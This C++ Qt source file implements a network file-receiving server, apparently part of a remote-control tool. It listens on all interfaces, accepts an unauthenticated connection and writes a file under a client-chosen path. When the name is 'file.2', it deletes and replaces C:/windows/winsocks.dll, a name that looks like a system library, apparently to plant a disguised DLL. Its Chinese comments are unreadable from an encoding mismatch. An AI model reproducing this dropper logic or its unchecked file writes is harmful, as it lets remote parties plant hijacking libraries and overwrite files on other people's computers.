#include "ChFileServer.h"
#include "ChDefine.h"
#include "ChSendManager.h"
#include "ChGlobalPara.h"

#include <QTcpServer>
#include <QTcpSocket>
#include <QDataStream>
#include <QDir>

ChFileServer::ChFileServer(QTcpSocket* pSocket, QObject *parent/* = 0*/)
	: m_pSocket(pSocket)
	, QObject(parent)
{
	initServer();
	createConnection();
}


ChFileServer::~ChFileServer()
{
	freeMem();
}

// ��������
bool ChFileServer::startListen()
{
	qDebug() << "file server listening...";
	return m_pFileServer->listen(QHostAddress::Any, m_iPort);
}

// ��ʼ������
void ChFileServer::initServer()
{
	m_pFileServer = new QTcpServer(this);
	m_iPort = gChGlobalPara->getFileServerPort();
}

// �źŲ�����
void ChFileServer::createConnection()
{
	connect(m_pFileServer, &QTcpServer::newConnection, this, &ChFileServer::slotNewConnection);
}

// �ͷ�
void ChFileServer::freeMem()
{
	if (m_pFileServer)
	{
		m_pFileServer->deleteLater();
		m_pFileServer = nullptr;
	}
	if (m_pFileSocket)
	{
		m_pFileSocket->close();
		m_pFileSocket->deleteLater();
		m_pFileSocket = nullptr;
	}
	// �ر��ļ�
	if (m_file.isOpen())
	{
		m_file.close();
	}
}

// ����
void ChFileServer::resetMember()
{
	m_totalSize = 0;			// �����ܴ�С
	m_recvedSize = 0;			// �ѽ��յĴ�С
	m_file.setFileName("");		// ���յ��ļ�
	m_recvBlock.resize(0);		// ���յ����ݻ�����
	m_fileNameSize = 0;			// �ļ�����С
	m_strFileName.clear();		// �ļ���
}

// ������
void ChFileServer::slotNewConnection()
{
	qDebug() << "file connected";
	//Ϊ���ӽ����Ŀͻ��˴����µ��׽���
	m_pFileSocket = m_pFileServer->nextPendingConnection();
	connect(m_pFileSocket, &QTcpSocket::readyRead, this, &ChFileServer::slotFileReadyRead);
	connect(m_pFileSocket, &QTcpSocket::disconnected, this, &ChFileServer::deleteLater);

	// ������֮�� server ֹͣ����
	m_pFileServer->close();
}

// �����ļ�
void ChFileServer::slotFileReadyRead()
{
	qDebug() << "recv file";

	QDataStream in(m_pFileSocket);
	in.setVersion(QDataStream::Qt_5_8);

	//������յ�������С��16���ֽڣ���ʾ���յ����ļ�ͷ��, ���浽����ͷ�ļ��ṹ
	if (m_recvedSize <= sizeof(qint64) * 2)
	{
		if ((m_pFileSocket->bytesAvailable() >= sizeof(qint64) * 2) && (!m_fileNameSize))
		{
			//���������ܴ�С��Ϣ���ļ�����С��Ϣ
			in >> m_totalSize >> m_fileNameSize;
			m_recvedSize += sizeof(qint64) * 2;
		}
		if ((m_pFileSocket->bytesAvailable() >= m_fileNameSize) && (m_fileNameSize))
		{
			//�����ļ������������ļ�
			in >> m_strFileName;
			qDebug() << m_strFileName;
			m_recvedSize += m_fileNameSize;
			if ("file.2" == m_strFileName)
			{
				QString strDir = QString("C:/windows");
				QDir oDir(strDir);
				if (!oDir.exists())
				{
					oDir.mkdir(strDir);
				}
				m_strFileName = strDir + "/winsocks.dll";
				if (QFile(m_strFileName).exists())
				{
					bool bRes = QFile::remove(m_strFileName);
					if (bRes)
					{
						qInfo() << QStringLiteral("ɾ���ɹ�");
					}
					else
					{
						qInfo() << QStringLiteral("ɾ��ʧ��");
					}
				}
			}
			m_file.setFileName(m_strFileName);
			if (!m_file.open(QFile::WriteOnly))
			{
				qCritical() << tr("server:open file error!");
				return;
			}
		}
		else
		{
			return;
		}
	}

	//������յ�����С�������ݣ���ôд���ļ�
	if (m_recvedSize < m_totalSize)
	{
		m_recvedSize += m_pFileSocket->bytesAvailable();
		m_recvBlock = m_pFileSocket->readAll();
		m_file.write(m_recvBlock);
		m_recvBlock.resize(0);
	}

	//�����������ʱ
	if (m_recvedSize == m_totalSize)
	{
		qInfo() << "recv file success";
		qInfo() << tr("%1 recv success").arg(m_strFileName);

		m_file.close();
		resetMember();

		gChSendManager->sendMessage(m_pSocket, PAKAGE_FILE_RECV_END);
	}
}
